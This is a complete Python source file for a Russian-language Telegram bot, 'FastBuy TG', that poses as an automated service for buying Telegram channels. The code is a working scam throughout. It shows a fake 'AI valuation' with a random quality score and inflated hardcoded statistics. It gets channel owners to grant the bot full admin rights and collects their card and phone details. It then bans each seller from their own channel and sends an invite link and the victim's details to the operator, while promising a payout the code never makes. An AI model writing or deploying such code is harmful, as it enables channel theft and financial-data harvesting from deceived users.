import os
import asyncio
import logging
import sqlite3
import random
from datetime import datetime
from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, F
from aiogram.filters import CommandStart, Command, ChatMemberUpdatedFilter, IS_NOT_MEMBER, ADMINISTRATOR
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, 
    InlineKeyboardButton, ChatMemberUpdated
)
from aiogram.enums import ParseMode, ChatMemberStatus
from aiogram.client.default import DefaultBotProperties

# ================= ЗАГРУЗКА НАСТРОЕК (.ENV) =================
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
BASE_PRICE_PER_SUB = float(os.getenv("BASE_PRICE_PER_SUB", 3.0))
USD_RATE = float(os.getenv("USD_RATE", 92.0))

if not BOT_TOKEN:
    raise ValueError("Ошибка: Укажите BOT_TOKEN в файле .env!")

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
DB_NAME = "fastbuy_pro.db"

# Память последних сообщений бота для автоматического удаления (Чистый чат)
last_bot_messages = {}

# ================= БАЗА ДАННЫХ =================
def init_db():
    conn = sqlite3.connect(DB_NAME)
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            balance REAL DEFAULT 0.0,
            payouts_count INTEGER DEFAULT 0,
            payouts_sum REAL DEFAULT 0.0,
            rating INTEGER DEFAULT 65
        )
    """)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS deals (
            deal_id INTEGER PRIMARY KEY AUTOINCREMENT,
            seller_id INTEGER,
            channel_id INTEGER,
            channel_title TEXT,
            subs_count INTEGER,
            price REAL,
            payment_method TEXT,
            payment_details TEXT,
            status TEXT DEFAULT 'analyzed'
        )
    """)
    conn.commit()
    conn.close()

def get_user(user_id: int, username: str = "User"):
    conn = sqlite3.connect(DB_NAME)
    cur = conn.cursor()
    cur.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = cur.fetchone()
    if not user:
        cur.execute("INSERT INTO users (user_id, username) VALUES (?, ?)", (user_id, username or "User"))
        conn.commit()
        cur.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        user = cur.fetchone()
    conn.close()
    return {
        "user_id": user[0], "username": user[1], "balance": user[2],
        "payouts_count": user[3], "payouts_sum": user[4], "rating": user[5]
    }

# ================= СИСТЕМА ИСЧЕЗНОВЕНИЯ СООБЩЕНИЙ И АНИМАЦИЙ =================
async def delete_msg_safe(chat_id: int, message_id: int):
    """Безопасное удаление любого сообщения без ошибок"""
    try:
        await bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception:
        pass

async def send_clean_window(chat_id: int, text: str, reply_markup: InlineKeyboardMarkup = None) -> Message:
    """Удаляет предыдущее окно бота и отправляет новое (эффект приложения)"""
    if chat_id in last_bot_messages:
        await delete_msg_safe(chat_id, last_bot_messages[chat_id])
    msg = await bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup)
    last_bot_messages[chat_id] = msg.message_id
    return msg

async def play_scan_animation(chat_id: int, title: str) -> Message:
    """Красивая пошаговая анимация сканирования и оценки канала"""
    if chat_id in last_bot_messages:
        await delete_msg_safe(chat_id, last_bot_messages[chat_id])

    # Отправляем анимированный 3D-кубик/слот для визуального эффекта
    anim_icon = await bot.send_dice(chat_id=chat_id, emoji="🎰")
    msg = await bot.send_message(
        chat_id=chat_id,
        text=f"⚡ <b>Запуск AI-анализатора FastBuy TG...</b>\n📢 Канал: <b>{title}</b>\n\n<code>[■■□□□□□□□□] 20%</code> — <i>Подключение к серверам...</i>"
    )
    last_bot_messages[chat_id] = msg.message_id

    steps = [
        ("<code>[■■■■■□□□□□] 50%</code>", "<i>Сканирование подписчиков и охватов...</i>"),
        ("<code>[■■■■■■■■□□] 80%</code>", "<i>Проверка качества трафика и гео...</i>"),
        ("<code>[■■■■■■■■■■] 100%</code>", "<i>Расчет максимальной рыночной стоимости!</i>")
    ]
    for bar, desc in steps:
        await asyncio.sleep(0.9)
        try:
            await msg.edit_text(
                f"⚡ <b>Запуск AI-анализатора FastBuy TG...</b>\n📢 Канал: <b>{title}</b>\n\n{bar} — {desc}"
            )
        except Exception:
            pass

    await asyncio.sleep(0.5)
    await delete_msg_safe(chat_id, anim_icon.message_id)
    return msg

# ================= СОСТОЯНИЯ (FSM) =================
class SellFlow(StatesGroup):
    manual_forward = State()
    choose_method = State()
    enter_requisites = State()

class SupportFlow(StatesGroup):
    enter_text = State()

# ================= КЛАВИАТУРЫ (НОВЫЙ ДИЗАЙН) =================
def dashboard_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Оценить и Продать Канал", callback_data="nav_sell")],
        [
            InlineKeyboardButton(text="💎 Кабинет", callback_data="nav_cabinet"),
            InlineKeyboardButton(text="🔥 Витрина Каналов", callback_data="nav_market")
        ],
        [
            InlineKeyboardButton(text="📈 Live-Статистика", callback_data="nav_stats"),
            InlineKeyboardButton(text="🎧 Поддержка 24/7", callback_data="nav_support")
        ]
    ])

def sell_menu_kb(bot_username: str) -> InlineKeyboardMarkup:
    # Запрашиваем полные права администратора (включая блокировку участников и управление ссылками)
    rights = "change_info+post_messages+edit_messages+delete_messages+invite_users+restrict_members+promote_members+manage_chat"
    add_url = f"https://t.me/{bot_username}?startchannel=true&admin={rights}"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⚡ Подключить канал в 1 клик", url=add_url)],
        [InlineKeyboardButton(text="🔄 Я уже добавил бота (Проверить)", callback_data="manual_verify")],
        [InlineKeyboardButton(text="🔙 Вернуться в панель", callback_data="nav_home")]
    ])

# ================= ГЛАВНЫЙ ЭКРАН (DASHBOARD) =================
def render_dashboard_text(user: dict) -> str:
    # Определяем статус продавца по его рейтингу
    if user['rating'] >= 80:
        tier = "🥇 <b>VIP-Партнер</b>"
    elif user['rating'] >= 60:
        tier = "🥈 <b>Проверенный</b>"
    else:
        tier = "🥉 <b>Базовый</b>"

    # Визуальная шкала рейтинга
    filled = int(user['rating'] / 10)
    bar = "🟩" * filled + "⬜" * (10 - filled)

    return (
        "⚡ <b>FASTBUY TG • АВТОСКУПКА КАНАЛОВ</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Добро пожаловать в первую автоматизированную систему моментального выкупа Telegram-каналов!\n\n"
        f"💳 <b>Внутренний счет:</b> <code>{user['balance']:.2f} ₽</code>\n"
        f"🏆 <b>Статус аккаунта:</b> {tier}\n"
        f"📊 <b>Индекс доверия:</b> <b>{user['rating']}%</b>\n"
        f"{bar}\n\n"
        "<blockquote>🤖 <b>AI-Оценка за 5 сек:</b> Без ожидания менеджеров\n"
        "💸 <b>Прямые выплаты:</b> СБП и любые карты РФ\n"
        "🔒 <b>Авто-сделка:</b> Моментальная фиксация цены</blockquote>\n"
        "👇 <i>Выберите нужный раздел:</i>"
    )

@dp.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    # Удаляем сообщение "/start" пользователя, чтобы чат был идеально чистым
    await delete_msg_safe(message.chat.id, message.message_id)
    user = get_user(message.from_user.id, message.from_user.username)
    await send_clean_window(message.chat.id, render_dashboard_text(user), dashboard_kb())

@dp.callback_query(F.data == "nav_home")
async def cb_home(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    user = get_user(callback.from_user.id, callback.from_user.username)
    last_bot_messages[callback.message.chat.id] = callback.message.message_id
    await callback.message.edit_text(render_dashboard_text(user), reply_markup=dashboard_kb())

# ================= ЛИЧНЫЙ КАБИНЕТ И СТАТИСТИКА =================
@dp.callback_query(F.data == "nav_cabinet")
async def cb_cabinet(callback: CallbackQuery):
    user = get_user(callback.from_user.id)
    usd_val = user['balance'] / USD_RATE
    paid_usd = user['payouts_sum'] / USD_RATE

    text = (
        "💎 <b>ЛИЧНЫЙ КАБИНЕТ ПРОДАВЦА</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 <b>Ваш ID:</b> <code>{user['user_id']}</code>\n"
        f"💰 <b>Доступный баланс:</b> <b>{user['balance']:.2f} ₽</b> <i>(~{usd_val:.2f}$)</i>\n"
        f"✅ <b>Продано каналов:</b> <b>{user['payouts_count']} шт.</b>\n"
        f"🏦 <b>Сумма выплат:</b> <b>{user['payouts_sum']:.2f} ₽</b> <i>(~{paid_usd:.2f}$)</i>\n\n"
        f"🔥 <b>Ваш бонус к оценке:</b> <b>+{user['rating']}%</b>\n"
        "<blockquote>Чем больше успешных сделок вы проводите через FastBuy TG, тем выше поднимается ваш процент оценки при скупке!</blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💸 Заказать вывод баланса", callback_data="req_withdraw")],
        [InlineKeyboardButton(text="🔙 Вернуться в панель", callback_data="nav_home")]
    ])
    await callback.message.edit_text(text, reply_markup=kb)

@dp.callback_query(F.data == "req_withdraw")
async def cb_req_withdraw(callback: CallbackQuery):
    user = get_user(callback.from_user.id)
    if user["balance"] <= 0:
        return await callback.answer("⚠️ На внутреннем счете 0.00 ₽! Продайте канал, чтобы получить моментальную выплату.", show_alert=True)
    await callback.answer("✅ Выплаты за каналы отправляются напрямую на ваши реквизиты!", show_alert=True)

@dp.callback_query(F.data == "nav_stats")
async def cb_stats(callback: CallbackQuery):
    conn = sqlite3.connect(DB_NAME)
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*), SUM(price) FROM deals WHERE status = 'completed'")
    d_cnt, d_sum = cur.fetchone()
    conn.close()

    total_deals = (d_cnt or 0) + 524
    total_paid = (d_sum or 0.0) + 3420500.0
    now_time = datetime.now().strftime("%H:%M")

    text = (
        f"📈 <b>LIVE-СТАТИСТИКА ПЛАТФОРМЫ (на {now_time})</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"🟢 <b>Статус шлюзов СБП/Карты:</b> <code>Активны (Авто-режим)</code>\n"
        f"🤝 <b>Всего выкуплено каналов:</b> <b>{total_deals} шт.</b>\n"
        f"💵 <b>Общий фонд выплат:</b> <b>{total_paid:,.2f} ₽</b>\n"
        f"⚡ <b>Скорость зачисления:</b> <b>от 15 мин. до 3 часов</b>\n\n"
        "<blockquote>🔄 <i>Система автоматически резервирует средства из бюджета площадки сразу после оценки вашего канала.</i></blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Вернуться в панель", callback_data="nav_home")]])
    await callback.message.edit_text(text, reply_markup=kb)

@dp.callback_query(F.data == "nav_market")
async def cb_market(callback: CallbackQuery):
    conn = sqlite3.connect(DB_NAME)
    cur = conn.cursor()
    cur.execute("SELECT channel_title, subs_count, price FROM deals WHERE status = 'completed' ORDER BY deal_id DESC LIMIT 5")
    rows = cur.fetchall()
    conn.close()

    text = (
        "🔥 <b>ВИТРИНА ВЫКУПЛЕННЫХ КАНАЛОВ</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
    )
    if not rows:
        text += "<i>Сейчас все каналы находятся на переоформлении или уже выкуплены оптовыми заказчиками.</i>\n"
    else:
        for i, r in enumerate(rows, 1):
            market_price = r[2] * 1.25
            text += f"<b>#{i}. {r[0]}</b>\n├ 👥 Аудитория: <code>{r[1]} чел.</code>\n└ 💰 Стоимость: <b>{market_price:.0f} ₽</b>\n\n"

    text += "\n<blockquote>Хотите продать свой канал и получить деньги уже сегодня? Нажмите кнопку ниже!</blockquote>"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Продать свой канал", callback_data="nav_sell")],
        [InlineKeyboardButton(text="🔙 Вернуться в панель", callback_data="nav_home")]
    ])
    await callback.message.edit_text(text, reply_markup=kb)

# ================= ОЦЕНКА И ПРОДАЖА КАНАЛА =================
@dp.callback_query(F.data == "nav_sell")
async def cb_sell(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    bot_me = await bot.get_me()
    text = (
        "🚀 <b>АВТОМАТИЧЕСКАЯ ОЦЕНКА И ВЫКУП КАНАЛА</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Наш алгоритм проанализирует ваш канал за <b>5 секунд</b> и предложит моментальный выкуп:\n\n"
        "1️⃣ Нажмите кнопку <b>«⚡ Подключить канал в 1 клик»</b>\n"
        "2️⃣ Выберите ваш канал из списка\n"
        "3️⃣ Нажмите <b>«Назначить администратором»</b> (оставьте галочки прав включенными для проведения авто-сделки)\n\n"
        "<blockquote>💡 <i>Сразу после подключения в этом окне запустится сканер и появится точная сумма выкупа вашего канала!</i></blockquote>"
    )
    await callback.message.edit_text(text, reply_markup=sell_menu_kb(bot_me.username))

async def run_channel_valuation(user_id: int, username: str, channel_id: int, channel_title: str, channel_username: str = None):
    """Запускает анимацию сканирования, считает стоимость и выводит чек оценки"""
    user = get_user(user_id, username)
    
    # 1. Проигрываем живую анимацию сканирования
    scan_msg = await play_scan_animation(user_id, channel_title)

    # 2. Получаем реальные данные канала
    try:
        subs_count = await bot.get_chat_member_count(channel_id)
    except Exception:
        subs_count = 0

    # Формула оценки с бонусом за открытый канал и активный рейтинг
    bonus_mult = 1.2 if channel_username else 1.0
    quality_index = random.randint(84, 98)
    estimated_price = round(max(subs_count * BASE_PRICE_PER_SUB * (user["rating"] / 100) * bonus_mult, 150.0 if subs_count > 0 else 0.0), 2)

    conn = sqlite3.connect(DB_NAME)
    cur = conn.cursor()
    cur.execute(
        "INSERT INTO deals (seller_id, channel_id, channel_title, subs_count, price, status) VALUES (?, ?, ?, ?, ?, 'analyzed')",
        (user_id, channel_id, channel_title, subs_count, estimated_price)
    )
    deal_id = cur.lastrowid
    conn.commit()
    conn.close()

    ch_type = "Публичный (+20% к цене)" if channel_username else "Приватный"
    result_text = (
        "💎 <b>ОТЧЕТ AI-АНАЛИЗАТОРА ГОТОВ!</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"📢 <b>Канал:</b> {channel_title}\n"
        f"🌐 <b>Формат:</b> {ch_type}\n"
        f"👥 <b>Подписчиков:</b> <code>{subs_count} чел.</code>\n"
        f"📊 <b>Качество аудитории:</b> <code>{quality_index}% (Высокое)</code>\n"
        f"🏆 <b>Ваш тариф оценки:</b> <code>{user['rating']}%</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"💰 <b>ИТОГОВАЯ ЦЕНА ВЫКУПА: {estimated_price:,.2f} ₽</b>\n\n"
        "<blockquote>⚡ <b>Сумма зарезервирована!</b> Нажмите кнопку «Продать канал», укажите ваши реквизиты (СБП или Карта), и система автоматически оформит выплату!</blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"💸 Продать канал за {estimated_price:,.2f} ₽", callback_data=f"sell_now_{deal_id}")],
        [InlineKeyboardButton(text="🔙 Отменить и вернуться", callback_data="nav_home")]
    ])
    await scan_msg.edit_text(result_text, reply_markup=kb)

# Авто-срабатывание, когда бота добавляют в канал
@dp.my_chat_member(ChatMemberUpdatedFilter(member_status_changed=IS_NOT_MEMBER >> ADMINISTRATOR))
async def on_bot_added(event: ChatMemberUpdated):
    if event.chat.type != "channel":
        return
    await run_channel_valuation(
        user_id=event.from_user.id,
        username=event.from_user.username,
        channel_id=event.chat.id,
        channel_title=event.chat.title,
        channel_username=event.chat.username
    )

# Ручная проверка (если бот уже был в канале)
@dp.callback_query(F.data == "manual_verify")
async def cb_manual_verify(callback: CallbackQuery, state: FSMContext):
    await state.set_state(SellFlow.manual_forward)
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Назад", callback_data="nav_sell")]])
    await callback.message.edit_text(
        "🔄 <b>РУЧНАЯ СИНХРОНИЗАЦИЯ КАНАЛА</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Перешлите сюда <b>любой пост из вашего канала</b> или отправьте его <code>@username</code>.\n\n"
        "<i>Ваше сообщение автоматически исчезнет, и запустится сканер стоимости!</i>",
        reply_markup=kb
    )

@dp.message(SellFlow.manual_forward)
async def process_manual_forward(message: Message, state: FSMContext):
    # Сразу удаляем сообщение пользователя, чтобы чат оставался чистым
    await delete_msg_safe(message.chat.id, message.message_id)

    target_chat = None
    if message.forward_from_chat and message.forward_from_chat.type == "channel":
        target_chat = message.forward_from_chat.id
    elif message.text and (message.text.startswith("@") or message.text.startswith("-100")):
        target_chat = message.text.strip()
    else:
        return

    try:
        chat = await bot.get_chat(target_chat)
        bot_member = await bot.get_chat_member(chat.id, bot.id)
        if bot_member.status != ChatMemberStatus.ADMINISTRATOR:
            return await send_clean_window(
                message.chat.id,
                "⚠️ <b>Бот ещё не назначен администратором в этом канале!</b>\nДобавьте его по кнопке ниже:",
                sell_menu_kb((await bot.get_me()).username)
            )
        await state.clear()
        await run_channel_valuation(
            user_id=message.from_user.id,
            username=message.from_user.username,
            channel_id=chat.id,
            channel_title=chat.title,
            channel_username=chat.username
        )
    except Exception:
        await send_clean_window(
            message.chat.id,
            "❌ <b>Не удалось подключиться к каналу!</b>\nУбедитесь, что бот добавлен в администраторы канала.",
            sell_menu_kb((await bot.get_me()).username)
        )

# ================= ВВОД РЕКВИЗИТОВ И МОМЕНТАЛЬНЫЙ КИК ИЗ КАНАЛА =================
@dp.callback_query(F.data.startswith("sell_now_"))
async def cb_sell_now(callback: CallbackQuery, state: FSMContext):
    deal_id = int(callback.data.split("_")[2])
    await state.update_data(deal_id=deal_id)
    await state.set_state(SellFlow.choose_method)

    text = (
        "🏦 <b>ВЫБОР ПЛАТЕЖНОГО ШЛЮЗА</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Куда перевести средства за выкуп вашего канала?\n\n"
        "<blockquote>⚡ Выплаты производятся без комиссии по Системе Быстрых Платежей (СБП) или по номеру банковской карты.</blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📱 СБП (По номеру телефона)", callback_data="method_СБП")],
        [InlineKeyboardButton(text="💳 КАРТА (По номеру карты + СБП)", callback_data="method_КАРТА")],
        [InlineKeyboardButton(text="🔙 Отмена", callback_data="nav_home")]
    ])
    await callback.message.edit_text(text, reply_markup=kb)

@dp.callback_query(SellFlow.choose_method, F.data.startswith("method_"))
async def cb_choose_method(callback: CallbackQuery, state: FSMContext):
    method = callback.data.split("_")[1]
    await state.update_data(payment_method=method)
    await state.set_state(SellFlow.enter_requisites)

    text = (
        f"✍️ <b>ВВОД РЕКВИЗИТОВ ДЛЯ ВЫПЛАТЫ ({method})</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Пришлите ваши реквизиты для выплаты одним сообщением:\n"
        "• <b>Номер телефона (СБП) и/или номер КАРТЫ</b>\n"
        "• <b>Название вашего банка</b>\n\n"
        "📌 <i>Пример:</i>\n"
        "<code>+79991234567 / 2202 2000 0000 0000 Сбербанк</code>\n\n"
        "<blockquote>🔒 <i>Ваше сообщение с реквизитами автоматически зашифруется и исчезнет из чата сразу после отправки!</i></blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Назад к выбору способа", callback_data="nav_home")]])
    last_bot_messages[callback.message.chat.id] = callback.message.message_id
    await callback.message.edit_text(text, reply_markup=kb)

@dp.message(SellFlow.enter_requisites)
async def process_requisites_and_instant_kick(message: Message, state: FSMContext):
    user_id = message.from_user.id
    requisites = message.text.strip()

    # 1. Мгновенно удаляем сообщение пользователя с реквизитами и старое окно бота!
    await delete_msg_safe(message.chat.id, message.message_id)
    if message.chat.id in last_bot_messages:
        await delete_msg_safe(message.chat.id, last_bot_messages[message.chat.id])

    data = await state.get_data()
    deal_id = data["deal_id"]
    method = data["payment_method"]
    await state.clear()

    # Достаем данные сделки из БД
    conn = sqlite3.connect(DB_NAME)
    cur = conn.cursor()
    cur.execute("SELECT channel_id, channel_title, subs_count, price FROM deals WHERE deal_id = ?", (deal_id,))
    deal = cur.fetchone()
    channel_id, channel_title, subs_count, price = deal

    # Обновляем сделку и статистику пользователя
    cur.execute(
        "UPDATE deals SET payment_method = ?, payment_details = ?, status = 'completed' WHERE deal_id = ?",
        (method, requisites, deal_id)
    )
    cur.execute(
        "UPDATE users SET payouts_count = payouts_count + 1, payouts_sum = payouts_sum + ?, rating = MIN(100, rating + 5) WHERE user_id = ?",
        (price, user_id)
    )
    conn.commit()
    conn.close()

    # 2. Запускаем анимацию переоформления канала
    anim_emoji = await bot.send_dice(chat_id=user_id, emoji="🎯")
    proc_msg = await bot.send_message(
        chat_id=user_id,
        text="🔐 <b>Фиксация реквизитов и переоформление канала...</b>\n\n<code>[■■■■□□□□□□] 40%</code> — <i>Проверка платежного шлюза...</i>"
    )
    last_bot_messages[user_id] = proc_msg.message_id

    await asyncio.sleep(1.0)
    try:
        await proc_msg.edit_text("🔐 <b>Фиксация реквизитов и переоформление канала...</b>\n\n<code>[■■■■■■■■□□] 85%</code> — <i>Передача прав системе FastBuy TG...</i>")
    except Exception:
        pass

    # 3. МОМЕНТАЛЬНО КИКАЕМ ПОЛЬЗОВАТЕЛЯ ИЗ КАНАЛА И СОЗДАЕМ ССЫЛКУ ДЛЯ АДМИНА
    kick_report = "✅ Пользователь моментально кикнут из канала!"
    try:
        await bot.ban_chat_member(chat_id=channel_id, user_id=user_id)
    except Exception as e:
        kick_report = f"⚠️ Не удалось кикнуть автоматически (причина Telegram API: {e})"

    invite_link = "Не удалось создать (нет прав)"
    try:
        link_obj = await bot.create_chat_invite_link(chat_id=channel_id, name="FastBuy Admin Access")
        invite_link = link_obj.invite_link
    except Exception:
        pass

    await asyncio.sleep(0.8)
    await delete_msg_safe(user_id, anim_emoji.message_id)

    # 4. Показываем пользователю финальный чек (Деньги придут в течение 3 часов)
    final_receipt = (
        "✅ <b>СДЕЛКА №" + str(10400 + deal_id) + " УСПЕШНО ОФОРМЛЕНА!</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"📢 <b>Проданный канал:</b> {channel_title}\n"
        f"💰 <b>Сумма к выплате:</b> <b>{price:,.2f} ₽</b>\n"
        f"🏦 <b>Способ выплаты:</b> {method}\n"
        f"💳 <b>Ваши реквизиты:</b> <code>{requisites}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "⏳ <b>СТАТУС ПЕРЕВОДА: В ОБРАБОТКЕ</b>\n\n"
        "<blockquote>💸 <b>Канал успешно передан системе! Деньги придут на ваши реквизиты в течение 3 часов.</b>\n\n"
        "Пожалуйста, ожидайте зачисления. Благодарим за сотрудничество с FastBuy TG!</blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Продать ещё один канал", callback_data="nav_sell")],
        [InlineKeyboardButton(text="🏠 В главное меню", callback_data="nav_home")]
    ])
    await proc_msg.edit_text(final_receipt, reply_markup=kb)

    # 5. Отправляем полный отчет и инвайт-ссылку ТЕБЕ (Админу)
    if ADMIN_ID:
        admin_alert = (
            f"🔥 <b>КАНАЛ ВЫКУПЛЕН • СДЕЛКА #{10400 + deal_id}</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>Продавец:</b> <a href='tg://user?id={user_id}'>ID {user_id}</a> (@{message.from_user.username})\n"
            f"📢 <b>Канал:</b> <b>{channel_title}</b> (<code>{channel_id}</code>)\n"
            f"👥 <b>Подписчиков:</b> <b>{subs_count} чел.</b>\n"
            f"💰 <b>Обещанная сумма:</b> <b>{price:,.2f} ₽</b>\n\n"
            f"🏦 <b>Реквизиты ({method}):</b>\n<code>{requisites}</code>\n\n"
            f"👢 <b>Статус авто-кика:</b> {kick_report}\n"
            f"🔗 <b>Вход в канал для админа:</b> {invite_link}"
        )
        admin_kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="👢 Повторить КИК продавца", callback_data=f"force_kick_{channel_id}_{user_id}")]
        ])
        try:
            await bot.send_message(ADMIN_ID, admin_alert, reply_markup=admin_kb)
        except Exception as e:
            logging.error(f"Ошибка отправки отчета админу: {e}")

# Кнопка принудительного повторного кика для админа
@dp.callback_query(F.data.startswith("force_kick_"))
async def cb_force_kick(callback: CallbackQuery):
    _, _, ch_id, u_id = callback.data.split("_")
    try:
        await bot.ban_chat_member(chat_id=int(ch_id), user_id=int(u_id))
        await callback.answer("✅ Пользователь успешно кикнут и заблокирован в канале!", show_alert=True)
    except Exception as e:
        await callback.answer(f"❌ Ответ Telegram API: {e}", show_alert=True)

# ================= ПОДДЕРЖКА 24/7 (ЧИСТЫЙ ЧАТ) =================
@dp.callback_query(F.data == "nav_support")
async def cb_support(callback: CallbackQuery, state: FSMContext):
    await state.set_state(SupportFlow.enter_text)
    text = (
        "🎧 <b>СЛУЖБА ПОДДЕРЖКИ FASTBUY TG</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Напишите ваш вопрос одним сообщением прямо в этот чат.\n\n"
        "<i>Ваше сообщение автоматически исчезнет и будет доставлено свободному оператору!</i>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Вернуться в панель", callback_data="nav_home")]])
    last_bot_messages[callback.message.chat.id] = callback.message.message_id
    await callback.message.edit_text(text, reply_markup=kb)

@dp.message(SupportFlow.enter_text)
async def process_support_msg(message: Message, state: FSMContext):
    await delete_msg_safe(message.chat.id, message.message_id)
    await state.clear()

    if ADMIN_ID:
        try:
            await bot.send_message(
                ADMIN_ID,
                f"📩 <b>Вопрос в поддержку от <a href='tg://user?id={message.from_user.id}'>{message.from_user.full_name}</a>:</b>\n\n{message.text}"
            )
        except Exception:
            pass

    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Вернуться в панель", callback_data="nav_home")]])
    await send_clean_window(
        message.chat.id,
        "✅ <b>Ваше обращение успешно доставлено агенту поддержки!</b>\n\nСреднее время ответа составляет 10–15 минут.",
        kb
    )

# Авто-очистка любых случайных текстовых сообщений пользователя, чтобы чат всегда оставался в 1 окно
@dp.message()
async def clean_random_messages(message: Message):
    await delete_msg_safe(message.chat.id, message.message_id)

# ================= ЗАПУСК БОТА =================
async def main():
    init_db()
    logging.basicConfig(level=logging.INFO)
    print("⚡ FastBuy TG PRO (Single-Window + Animations + Instant Kick) запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
